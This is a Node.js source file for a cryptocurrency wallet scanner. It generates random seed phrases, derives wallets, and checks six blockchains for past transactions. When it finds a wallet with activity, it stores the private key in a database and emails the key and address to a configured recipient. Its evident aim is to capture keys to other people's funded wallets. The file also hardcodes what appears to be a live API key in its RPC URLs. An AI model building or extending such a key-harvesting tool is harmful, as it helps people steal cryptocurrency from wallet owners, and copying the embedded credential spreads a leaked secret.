const { ethers } = require('ethers');
const sqlite3 = require('sqlite3');
const { open } = require('sqlite');
const axios = require('axios');
const nodemailer = require('nodemailer');
require('dotenv').config();

// Chain configuration
const CHAINS = {
    ethereum: {
        name: 'Ethereum',
        rpc: 'https://eth-mainnet.g.alchemy.com/v2/GcaMdML_ABouJgG7Sa2X8Xu5iRH5UTUF'
    },
    polygon: {
        name: 'Polygon',
        rpc: 'https://polygon-mainnet.g.alchemy.com/v2/GcaMdML_ABouJgG7Sa2X8Xu5iRH5UTUF'
    },
    arbitrum: {
        name: 'Arbitrum',
        rpc: 'https://arb-mainnet.g.alchemy.com/v2/GcaMdML_ABouJgG7Sa2X8Xu5iRH5UTUF'
    },
    bsc: {
        name: 'Binance Smart Chain',
        rpc: 'https://bsc-dataseed1.binance.org'
    },
    avalanche: {
        name: 'Avalanche C-Chain',
        rpc: 'https://api.avax.network/ext/bc/C/rpc'
    },
    base: {
        name: 'Base Chain',
        rpc: 'https://mainnet.base.org'
    }
    // ,
    // optimism: {
    //     name: 'OP Mainnet',
    //     rpc: 'https://mainnet.optimism.io'
    // }
};

// Email configuration
const emailTransporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: parseInt(process.env.SMTP_PORT),
    secure: process.env.SMTP_PORT === '465',
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

// Initialize database
async function initializeDatabase() {
    const db = await open({
        filename: 'wallets.db',
        driver: sqlite3.Database
    });

    // Create mnemonics table
    await db.exec(`
        CREATE TABLE IF NOT EXISTS mnemonics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            mnemonic TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    // Create wallets table
    await db.exec(`
        CREATE TABLE IF NOT EXISTS wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            mnemonic_id INTEGER,
            private_key TEXT NOT NULL,
            wallet_address TEXT NOT NULL,
            derivation_path TEXT NOT NULL,
            ethereum_tx BOOLEAN DEFAULT 0,
            polygon_tx BOOLEAN DEFAULT 0,
            arbitrum_tx BOOLEAN DEFAULT 0,
            bsc_tx BOOLEAN DEFAULT 0,
            avalanche_tx BOOLEAN DEFAULT 0,
            base_tx BOOLEAN DEFAULT 0,
            optimism_tx BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (mnemonic_id) REFERENCES mnemonics(id)
        )
    `);

    // Create active_wallets table
    await db.exec(`
        CREATE TABLE IF NOT EXISTS active_wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            wallet_address TEXT NOT NULL,
            private_key TEXT NOT NULL,
            chain_name TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    return db;
}

// Send email notification for active wallet
async function sendActiveWalletNotification(wallet, chainName, options = {}) {
    try {
        const mailOptions = {
            from: `"${process.env.EMAIL_FROM_NAME}" <${process.env.SMTP_USER}>`,
            to: process.env.NOTIFICATION_EMAIL,
            subject: options.subject || process.env.EMAIL_SUBJECT || 'Active Wallet Found!',
            html: options.template || `
                <h2>Active Wallet Found!</h2>
                <p>A wallet with transactions has been discovered:</p>
                <ul>
                    <li><strong>Chain:</strong> ${chainName}</li>
                    <li><strong>Address:</strong> ${wallet.address}</li>
                    <li><strong>Private Key:</strong> ${wallet.privateKey}</li>
                    <li><strong>Discovery Time:</strong> ${new Date().toLocaleString()}</li>
                </ul>
                <p>Please secure this information appropriately.</p>
            `
        };

        const info = await emailTransporter.sendMail(mailOptions);
        console.log('Email notification sent:', info.messageId);
        return true;
    } catch (error) {
        console.error('Failed to send email notification:', error);
        return false;
    }
}

// Save mnemonic to database
async function saveMnemonic(db, mnemonic) {
    const result = await db.run(
        'INSERT INTO mnemonics (mnemonic) VALUES (?)',
        mnemonic
    );
    return result.lastID;
}

// Save wallet to database
async function saveWallet(db, mnemonicId, wallet, derivationPath) {
    await db.run(`
        INSERT INTO wallets (
            mnemonic_id, private_key, wallet_address, derivation_path
        ) VALUES (?, ?, ?, ?)
    `, [mnemonicId, wallet.privateKey, wallet.address, derivationPath]);
}

// Save active wallet to database
async function saveActiveWallet(db, wallet, chainName) {
    try {
        await db.run(
            'INSERT INTO active_wallets (wallet_address, private_key, chain_name) VALUES (?, ?, ?)',
            [wallet.address, wallet.privateKey, chainName]
        );
        
        // Send email notification
        await sendActiveWalletNotification(wallet, chainName);
    } catch (error) {
        console.error('Failed to save active wallet:', error);
        throw error;
    }
}

// Generate wallets from mnemonic
async function generateWalletsFromMnemonic(mnemonic) {
    const wallets = [];
    const hdNode = ethers.Wallet.fromPhrase(mnemonic);

    // Generate 3 wallets with different derivation paths
    for (let i = 0; i < 3; i++) {
        const path = `m/44'/60'/0'/0/${i}`;
        const derivedNode = ethers.HDNodeWallet.fromMnemonic(
            ethers.Mnemonic.fromPhrase(mnemonic),
            path
        );
        derivedNode.derivationPath = path;
        wallets.push(derivedNode);
    }

    return wallets;
}

// Check transactions for a wallet
async function checkTransactions(address, chain) {
    try {
        const provider = new ethers.JsonRpcProvider(chain.rpc);
        const txCount = await provider.getTransactionCount(address);
        return txCount > 0;
    } catch (error) {
        console.error(`Error checking transactions for ${chain.name}:`, error.message);
        return false;
    }
}

// Update transaction flags in database
async function updateTransactionFlags(db, wallet, chainResults) {
    const updates = Object.entries(chainResults)
        .map(([chainId, hasTransactions]) => `${chainId}_tx = ${hasTransactions ? 1 : 0}`)
        .join(', ');

    const query = `
        UPDATE wallets 
        SET ${updates}
        WHERE wallet_address = ?
    `;

    await db.run(query, wallet.address);
}

// Generate mnemonic
function generateMnemonic() {
    return ethers.Wallet.createRandom().mnemonic.phrase;
}

// Verify email configuration
async function verifyEmailConfig() {
    try {
        await emailTransporter.verify();
        return true;
    } catch (error) {
        console.error('Email configuration error:', error);
        return false;
    }
}

module.exports = {
    CHAINS,
    initializeDatabase,
    saveMnemonic,
    saveWallet,
    saveActiveWallet,
    generateWalletsFromMnemonic,
    checkTransactions,
    updateTransactionFlags,
    generateMnemonic,
    verifyEmailConfig,
    sendActiveWalletNotification
};